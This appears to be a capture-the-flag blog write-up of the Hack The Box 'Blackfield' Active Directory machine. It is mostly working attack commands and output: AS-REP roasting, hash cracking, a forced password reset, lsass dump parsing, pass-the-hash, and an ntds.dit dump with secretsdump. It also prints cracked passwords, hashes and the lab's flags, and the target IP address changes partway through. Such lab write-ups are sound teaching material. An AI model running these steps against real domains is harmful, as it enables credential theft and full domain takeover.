---
title: Blackfield - HTB Writeup
date: 2024-05-14 10:03
categories: [ctf, windows, hard, ad]
tags: [htb, windows, ctf, hard, ad]    # TAG names should be lowercase
---
# Machine Overview

Backfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations. Anonymous / Guest access to an SMB share. Kerbrute identify that support user have permissions "Do Not Require Pre-Authenticaton" which can be used to perform ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack using hashcat in order to recover the plaintext password. With these Credentials we discover that the user support have permission "ForceChangePassword"  on user AUDIT2020. With this we change the password of AUDIT2020 user and access an SMB share containing forensics artefacts, including an lsass process dump. This contains a username and a password for a user svc_backup with WinRM privileges, who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator.

![image](https://github.com/iammR0OT/iammR0OT.github.io/assets/74102381/49294cee-ad6b-443d-9a9a-51ef5acc239f)

# User 
## Scanning through Nmap
First of all we will go with nmap to scan the whole network and check for services running on the network. To scan the whole network and find all the open ports i use **-p-** used to scan the whole **65535** ports with **--min-rate 10000** to scan network faster from **nmap** and i found a list of open ports on the network and get only the open ports using different terminal tools like **cut**, **tr** etc. 

```shell
$ nmap -p- --min-rate 10000 10.10.10.175 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
53,88,135,389,445,593,3268,5985
```

Now Let's run the depth scan on these specific ports using 
```bash
$ nmap -p53,88,135,389,445,593,3268,5985 -sC -sV -A -T4 10.10.10.175 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-05 03:59:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-05T04:00:02
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h59m59s
```

## Information Gathering
Through **Nmap** we found port **53 DN**S is open which can be used to perform zone transfer, **88 kerberose** is open which can be used to for enumeration and authentication purpose here, **139 & 445 SMB** ports are open and can be used to enumerate network shares with anonymous user for initial access, **389 ldap** port is open, **5985 winrm** port is opened which can be used to login into machine if somehow we managed to obtain a valid credentials. **Nmap** discover Domain name by using **ldap** scripts which is **BLACKFIELD.local**. Let's add this to our local DNS file called `/etc/hots` so that our computer can resolve domain

```shell
$ echo "10.10.10.192   BLACKFIELD.local | sudo tee -a /etc/hosts
```

### Port 53 DNS
Let's start with the port **53** DNS and try to perform zone using **dig** (**dig** stands for **Domain Information Grabber**. It is used for retrieving information about DNS name servers. It is used for verifying and troubleshooting DNS problems and to perform DNS lookups). The complete command will be 

```shell
$ dig axfr @10.10.10.192 BLACKFIELD.local
```

Here **axfr** is a protocol(AXFR is **a protocol for “zone transfers” for replication of DNS data across multiple DNS servers**. Unlike normal DNS queries that require the user to know some DNS information ahead of time, **AXFR** queries reveal resource records including subdomain names). But we couldn't able to fetch any useful information.

```bash
$ dig axfr @10.10.10.192 BLACKFIELD.local

; <<>> DiG 9.19.19-1-Debian <<>> axfr @10.10.10.192 BLACKFIELD.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

We didn't fond anything using zone tarnsfer. Now, Let's perform subdomain Enumeration on that specific DNS server using **gobuster**

```bash
$ gobuster dns -d BLACKFIELD.local  --wordlist=/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r 10.10.10.192:53
```

Here **-r** is used to check in remote DNS server **IP:port** which we provide. It discover some, Lets add these also to our `/etc/hosts` file.

```bash
$ gobuster dns -d BLACKFIELD.local  --wordlist=/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r 10.10.10.192:53
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     BLACKFIELD.local
[+] Threads:    10
[+] Resolver:   10.10.10.192:53
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: gc._msdcs.BLACKFIELD.local

Found: domaindnszones.BLACKFIELD.local

Found: forestdnszones.BLACKFIELD.local
===============================================================
Finished
===============================================================
```

### 88 Kerberose
**kerbrute**(A tool to quickly bruteforce and enumerate valid Active Directory accounts through **Kerberos Pre-Authentication**) . it can also be used to perform password spraying on domain if somehow we managed to find a valid password. **Kerbrute** provide us many functions including
```
Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit
```

We will be using that **userenum** function to enumerate user's name in domain.

```bash
$ kerbrute userenum -d BLACKFIELD.local users-list --dc 10.10.10.192
```

 - **-d** is for domain name 
 - **--dc** for domain controller IP
 
```bash
$ kerbrute userenum -d BLACKFIELD.local  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.192 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/04/24 - Ronnie Flathers @ropnop

2024/02/04 16:01:49 >  Using KDC(s):
2024/02/04 16:01:49 >  	10.10.10.192:88

2024/02/04 16:05:27 >  [+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$support@BLACKFIELD.LOCAL:29ce038d99ce51bb19dd2a123bb76619$833c23188184c67ee1d9092f5335904c3e81328e30d7d739c624707c5c77c405d67532b6ef484887fdebd238d373bd5f40d69b81a853be141cf763353d48c4762ea8d67c9b4fe21c2e7c93b873dec4a6cdb45a22424a052f51bc3d65a3d2fa6f1ae381927d001a2527a5a2957d3ea8cd97aabfecfd6d5eea2f241e2d8c8c258ba62d76b2e9b6c4e6ed4a1b0b4f9adecb7877c2844e555b50bbfe47483cb6bcbfde02ba034325413b538a3a70b0a95d5d22be105ba8b734c1947b00af69f6f803ff390a50b14e6c83634bfc7d05d257a9eecafd08e507146f82d412625b474bfde79c6ad75dfd8839bf4992f9ea788aa7fe8ae5fb9cf8ac5cd4144ed72e5cb09f7f49db881f4fe36e
2024/02/04 16:05:27 >  [+] VALID USERNAME:	 support@BLACKFIELD.local
2024/02/04 16:07:10 >  [+] VALID USERNAME:	 guest@BLACKFIELD.local
2024/02/04 16:08:41 >  Done! Tested 750 usernames (2 valid) in 412.290 seconds
```

Kerbrute discover two user's, guest & support. **Support**  have permissions **Do not Require Pre-Authentication**. Which means it is vulnerable to ASRep Roast attack.
#### AsRep Roast Attack
**AS-Reproasting** occurs when a user account has the privilege "**Does not require Kerberos Pre-Authentication** set. This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified user account. So the user with that privilege's does not need of authentication for login
-  What is Pre-Authentication?
	 **Pre-authentication** is the initial stage in Kerberos authentication, which is managed by the KDC Authentication server and **is meant to prevent brute-force attacks**.
**Kerberute** dump **support** user hash for us. We can also dump that hash using **GetNPUsers.py** from impacket toolkit.
```bash
$ /opt/impacket-0.9.19/examples/GetNPUsers.py -dc-ip 10.10.10.192 BLACKFIELD.local/ -u user.txt -format hashcat -outputfile hash

Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
[-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- **-dc-ip** for domain controller IP
- **-u** for file name in which user's name exist
- **-format** to store hash in hashcat format
- **-outputfile** for the file name in which hash will be stored

```bash
$ cat hash 
$krb5asrep$23$support@BLACKFIELD.LOCAL:c5468673b909ee8d1b3e9473265e0e69$e2227fb3f52db685196f9c2177d72d4e4062e98df135b068dc822b6d226cc1dfb54f2fab68d4b847d246af4b387b1be89f1ebf8fb09c4996839dfa237809ace46cab5a1718f4d323eafbf6ddc0fcc505e9b68d3f3177b63b3bff3c3b03ea987337d0c09d7c52957416fd51b7b92c2913056c7d8dacc8c6f0173d3094073c33ddbfe5bfdd471d4cc90e074dfb36b1a3d8637b6203c2eba16b0fe0e3b07df0b881e785d7d14d51bcc9cd3c3e54eaf635811dd476e7ea376ee2d68765938e9f2e643fbda56266f15b63043f53638878afcafb348102fa1473bb30ef35c1d3f42311db2727379c95d6abe23f34e9fbb805ccf04ad72c
```

Now Let's crack this hash using **hashcat**(Hashcat is a **password cracking tool** used for licit and illicit purposes. Hashat is a particularly fast, efficient, and versatile hacking tool that assists brute-force attacks by conducting them with hash values of passwords that the tool is guessing or applying). 

```bash
$ hashcat -m 18200 hash rockyou.txt

$krb5asrep$23$support@BLACKFIELD.LOCAL:c5468673b909ee8d1b3e9473265e0e69$e2227fb3f52db685196f9c2177d72d4e4062e98df135b068dc822b6d226cc1dfb54f2fab68d4b847d246af4b387b1be89f1ebf8fb09c4996839dfa237809ace46cab5a1718f4d323eafbf6ddc0fcc505e9b68d3f3177b63b3bff3c3b03ea987337d0c09d7c52957416fd51b7b92c2913056c7d8dacc8c6f0173d3094073c33ddbfe5bfdd471d4cc90e074dfb36b1a3d8637b6203c2eba16b0fe0e3b07df0b881e785d7d14d51bcc9cd3c3e54eaf635811dd476e7ea376ee2d68765938e9f2e643fbda56266f15b63043f53638878afcafb348102fa1473bb30ef35c1d3f42311db2727379c95d6abe23f34e9fbb805ccf04ad72c:#00^BlackKnight
```

- **-m** for module in our case **krb5asrep** module number is 18200.

```user
support : #00^BlackKnight
```

### 139 & 445 SMB
We also have SMB ports open, let's try to list out smb shares if are available publicly using **smbclient**(The smbclient lets you **send messages to workstations, display browse lists and connect to SMB shares**). The command will be 
```bash
$ smbclient -N -L \\10.10.10.192
```
-  **-N** is for no-pass 
- **-L** for listing shares.
We found some valid shares.
```bash
$ smbclient -N -L \\10.10.10.192

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	forensic        Disk      Forensic / Audit share.
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	profiles$       Disk      
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.192 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

There is a share called **forensic** looks interesting to me. Let's run it through **smbmap**(**SMBMap** allows users to enumerate samba share drives across an entire domain. **List share drives, drive permissions, share contents, upload/download functionality, file name auto-download pattern matching, and even execute remote commands**. This tool was designed with pen testing in mind, and is intended to simplify searching for potentially sensitive data across large networks) to check the permissions on these shares at once with recursion on to check all the share and data present in them. But unfortunately we don't have access to it.

```bash
$ smbmap -H 10.10.10.192 -u anonymous -p '' -r

[+] IP: 10.10.10.192:445	Name: BLACKFIELD.local    	Status: | Disk       | Permissions | Comment                 |
|------------|-------------|-------------------------|
| ADMIN$     | NO ACCESS   | Remote Admin            |
| C$         | NO ACCESS   | Default share           |
| forensic   | NO ACCESS   | Forensic / Audit share  |
| IPC$       | READ ONLY   | Remote IPC              |
```

We have a support User credentials. Let's check if we can access **forensic** share with that. But it didn't worked either. Interesting...

```bash
$ smbmap -H 10.10.10.192 -u support -p '#00^BlackKnight'

[+] IP: 10.10.10.192:445	Name: BLACKFIELD.local    	Status: | Disk         | Permissions | Comment                  |
|------------|-------------|--------------------------|
| ADMIN$     | NO ACCESS   | Remote Admin             |
| C$         | NO ACCESS   | Default share            |
| forensic   | NO ACCESS   | Forensic / Audit share   |
| IPC$       | READ ONLY   | Remote IPC               |
| NETLOGON   | READ ONLY   | Logon server share       |
| profiles$  | READ ONLY   |                          |
| SYSVOL     | READ ONLY   | Logon server share       |
```

## BloodHound
 Now Let's run **bloodhound-python**, an investigator used to gather information from all over the domain. After it's completion, run bloodhound and upload it to bloodhound and start investigation on graph's.
 ```bash
$ bloodhound-python -c All -u support -p '#00^BlackKnight' -d BLACKFIELD.local -ns 10.10.10.192 --zip
```

- **-c** for collection method, i chose All to collect all kind of data
- **-u** for usernamne 
- **-p** for user Password
- **-d** for domain name
- **-ns** for name server
- **--zip** to store all the data in a zip file
Now Let's upload it to Bloodhound(**an Active Directory (AD) reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment**). To run Bloodhound we first need to start neo4j a graph database system. 
```shell
sudo neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
```

Now type simple bloodhound in new terminal and press enter to start the bloodhound. If you are running bloodhound for the first time you need to reset the default credentials of bloodhound which is `neo4j:neo4j`. After logging into the bloodhound upload the zip file we create by **bloodhound-python**. You can use both methods, either **drag and drop** the file into bloodhound or by using **upload data button** and wait for data to upload into the database. 

<img  alt="Pasted image 20240205025800" src="https://github.com/iammR0OT/HTB/assets/74102381/10187b4d-0409-440f-9f65-d7c051901f63">

Now search for support user in search bar and mark it as owned user.

<img  alt="Pasted image 20240205025949" src="https://github.com/iammR0OT/HTB/assets/74102381/794a9ffb-8dab-4a0a-9910-05aacff27577">

From OUTBound Transitive Control, I discover that the support user have **ForceChangePassword** permission on AUDIT2020@Blackfield.local user. Which means we can change the password of AUDIT user without knowing the current password of it.

<img alt="Pasted image 20240205030317" src="https://github.com/iammR0OT/HTB/assets/74102381/00d210f1-7926-47df-869f-27d0e492700e">

### Exploitation
Let's Exploit this Permission using **net rpc pasword**(The **`net rpc`** command in **Kali Linux** is a powerful utility that allows you to interact with **Remote Procedure Call (RPC)** endpoints via named pipes. It’s particularly useful for tasks related to **SMB (Server Message Block)** protocol and Windows networking)
```bash
$ net rpc password "AUDIT2020" "supersecurep@ssword123" --user='BLACKFIELD.LOCAL/support%#00^BlackKnight' -S 10.10.10.192
```

Now we can access the **forensic** share using **AUDIT2020** user and the password, we set. 
```bash
$ smbmap -H 10.10.10.192 -u AUDIT2020 -p 'supersecurep@ssword123'

[+] IP: 10.10.10.192:445	Name: BLACKFIELD.local    	Status: Authenticated
| Disk       | Permissions | Comment                  |
|------------|-------------|--------------------------|
| ADMIN$     | NO ACCESS   | Remote Admin             |
| C$         | NO ACCESS   | Default share            |
| forensic   | READ ONLY   | Forensic / Audit share   |
| IPC$       | READ ONLY   | Remote IPC               |
| NETLOGON   | READ ONLY   | Logon server share       |
| profiles$  | READ ONLY   |                          |
| SYSVOL     | READ ONLY   | Logon server share       |
```

Let's connect to forensic share using **smbclient**.

```bash
$ smbclient \\\\10.10.10.192\\forensic --user='blackfield.local/audit2020%supersecurep@ssword123'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020
```

inside **memeory_analysis** directory, i found a lsass.zip file which can be have the hashes of users.

<img alt="Pasted image 20240205033225" src="https://github.com/iammR0OT/HTB/assets/74102381/097982e9-3b1b-4bd4-9a1c-90565f2b7042">

After downloading to my local machine, i unzip it and extracted a file called lsass.DMP. so i quickly google that "how to analyse lsass.dmp" file and at very top and article come into my vision.[How to extract information from .DMP files - Technical Navigator](https://technicalnavigator.in/how-to-extract-information-from-dmp-files/). So according to this article , we can extract useful information from lsass.dmp file using tool called **pypykatz**(pypykatz is a python version of **mimikatz** and can be used to perform **mimikatz** functionalities remotely without having a shell on the machine)
```bash
$ pypykatz lsa minidump lsass.DMP

INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef621
	== WDIGEST [633ba]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
	== WDIGEST [633ba]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
```

and at very top i found a svc_backup user NT hash which can be used to perform **pass-the-hash** attack.

#### Pass-The-Hash Attack
A pass the hash attack occur when **an attacker uses the hashed user credential to authenticate to a remote system** The attacker does not need to know or crack the plaintext password, as the hash is sufficient to create a new user session on the same network. This technique exploits the use of **NTLM** or **LanMan** hash of a user's password by some services or servers.
Let's First check if we have a valid hash or not using **crackmapexec**, And we have.
```bash
$ cme winrm 10.10.10.192 -u svc_backup -H "9658d1d1dcd9250115e2205d9f48400d" 
SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
HTTP        10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

### Shell with Evil-winrm
Evil-WinRM is an **open-source, command-line-based tool that provides remote shell access to Windows machines over WinRM (Windows Remote Management). WinRM is a management protocol used to perform tasks on Windows-based systems remotely**. Evil-WinRM leverages the weaknesses in WinRM to establish a foothold on a target system, allowing ethical hackers to perform various post-exploitation activities. For in depth knowledge, click [here](https://medium.com/@S3Curiosity/exploring-evil-winrm-a-powerful-ethical-hacking-tool-for-windows-environments-21918b56f18a)

```bash
$ evil-winrm -i 10.10.10.192 -u svc_backup -H "9658d1d1dcd9250115e2205d9f48400d"
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> 
```
# Privilege Escalation
Let's check what permissions we have on domain.
```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We **SeBackuprivilege** and **SeRestorePrivilege**. Now Let's check groups, of member we are.
```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> net user svc_backup
User name                    svc_backup
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2020 9:54:48 AM
Password expires             Never
Password changeable          2/24/2020 9:54:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/23/2020 10:03:50 AM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
```

And we are member of **Backup Operators** group in domain.
#### What is Backup Operators group?
 **Backup Operators** group is an historical Windows built in group. Backup operator groups allows users to take the **backup** and **restore** files regardless whether they have **access** to the files or not.
 Privileges of backup Operators
- Can recover and back up files.
- Can create a system backup.
- Able to recover system state. (Only Windows® XP and 2003). To restore system state on Windows Vista, 7, 8, 8.1, 2008, or 10, you must also be a member of the Administrators group.
- The TSM Scheduler service can be started
## Exploitation
There are multiple ways to exploit **SeBackupPrivileges** permissions. [refrence](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)
### Diskshadow & Robocopy 
Diskshadow and Robocopy are both windows buil-in utilities. **Diskshadow** creates copies of a currently used drive because we cannot create a copy of running system files, while **Robocopy** copies files and directories from one location to another.
Let's Create a script which will create a full backup of `C:\`  and exposes it as a network drive with the drive letter `E:\`.

```bash
$ cat backup.txt 
set verbose on 
set metadata C:\Windows\Temp\meta.cab 
set context clientaccessible 
set context persistent 
begin backup 
add volume C: alias cdrive 
create 
expose %cdrive% E: 
end backup 
```

- `set verbose on` to enable verbosity
- `set metadata C:\Windows\Temp\meta.cab` Location of metadata
- `set context clientaccessible` to make backup accessible to us
- `set context persistent` making it persistent so that we never lost it after the re-boot
- `begin backup` initiates backup process
- `add volume C: alias cdrive` includes the `C:\` drive, and assigns it an alias such as **cdrive** for reference
- `create` create a backup
- `expose %cdrive% E:` expose alias **cdrive** as a network drive
- `end backup` to finalize the backup
 
Now upload the backup script to victim machine using **upload** feature of evil-winrm.

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> upload backup.txt
```

Now create a **shadow copy** using diskshadow utility.

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s backup.txt
```

- `/s` for script file path

When shadow copy created successfully. Now we have to extract **ntds.dit** file from the network drive. For this we will use **robocopy** utility.
```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy /b E:\Windows\ntds . ntds.dit
``` 

- `/b` for source file path.

We extract the ntds.dit file sccessfully, now we need a decryption key to decrypt the ntds.dit file extract the password hashes form it. we will use `reg save` command for that
```powershell 
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save hklm\system system.bak
```

Now we have both **ntds.dit** file and the decryption key used to decrypt it. Let's download it to our local attacking machine using download functionality of evilwinrm.

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> download ntds.dit
*Evil-WinRM* PS C:\Users\svc_backup\Documents> download system.bak
```

#### Secretsdump.py 
**SecretsDump.py** is a Python tool by Impacket that can extract secrets from targets. **SecretsDump.py** performs various techniques to dump hashes from the remote machine without executing any agent there. For **SAM** and **LSA** Secrets (including cached creds) it tries to read as much as it can from the **registry** and then saves the hives in the target system `(%SYSTEMROOT%\Temp dir)` and reads the rest of the data from there. For **NTDS.dit** it uses the **Volume Shadow Copy Service** to read **NTDS.dit** directly from the disk or it can use the parser module to read NTDS.dit files from a copy.

```bash
$ secretsdump.py -ntds ntds.dit -system system.bak -hashes lmhash:nthash LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:84b4bfcc9488b32d9e09feeb18ccfc9b:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

Now we have the hashes of different user's and Administrator. We can bruteforce them offline to extract the plain text password or can also perform **pass-the-hash** attack to gain remote shell on user account

## Pass-The-Hash
**pass the hash** is a hacking technique that allows an attacker to authenticate to a remote server or service by using the underlying **NTLM** or **LanMan** hash of a user's password, instead of requiring the associated plaintext password as is normally the case. It replaces the need for stealing the plaintext password to gain access with stealing the hash. This happens due to **NTLM** protocol, used in AD to authenticate users. [reference](https://en.wikipedia.org/wiki/NTLM)

We can perform **pass-the-hash** attack using different tools like `evil-winrm`, `psexec.py` and `wmiexec.py`

#### Evil-wirnm
Using Evil-winrm.
```powershell
$ evil-winrm -i blackfield.local -u administrator -H '184fb5e5178480be64824d4cd53b99ee'
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami 
blackfield\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
#### wmiexec.py
`wmiexec.py` is another script part of the Impacket framework. It is used to silently execute commands against a compromised endpoint using WMI.
```bash
$ wmiexec.py 'blackfield.local/administrator@10.10.10.192'  -hashes 'aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee' 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>whoami
blackfield\administrator
```

# Flags
User : 3920bb317a0bef51027e2852be64b543
Root : 4375a629c7c67c8e29db269060c955cb

# Happy Hacking ❤
